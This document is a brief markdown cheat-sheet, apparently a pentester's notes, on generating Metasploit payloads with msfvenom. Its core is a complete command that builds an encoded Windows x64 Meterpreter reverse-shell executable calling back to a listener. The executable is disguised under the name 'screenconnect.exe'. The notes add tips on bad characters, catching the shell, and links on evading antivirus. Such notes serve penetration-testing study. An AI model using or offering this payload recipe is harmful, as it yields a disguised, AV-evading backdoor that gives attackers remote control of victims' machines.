# Payload Creation Examples
1. x64 `exe`
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=7778 -f exe -e x86/shikata_ga_nai -i 8 -b '\x00\x0a\x0d\x20' > screenconnect.exe
```
> Meterpreter payloads need Metasploit’s **multi/handler** to catch the shell.[\[1\]](https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86)
> Classic bad characters: **\x0a** (line feed), **\x0d** (carriage return) & **\x20** (space)[\[1\]](https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86)

# Encoders
The most commonly mentioned MSFVenom encoder I've seen lately is the `x86/shikata_ga_nai` encoder.[\[1\]](https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86)
A short guide on how to use C++ to generate a program using generated shellcode: [\[2\]](https://www.virtuesecurity.com/evading-antivirus-with-better-meterpreter-payloads/) 

# Resources
1. https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86
2. https://www.virtuesecurity.com/evading-antivirus-with-better-meterpreter-payloads/
3. 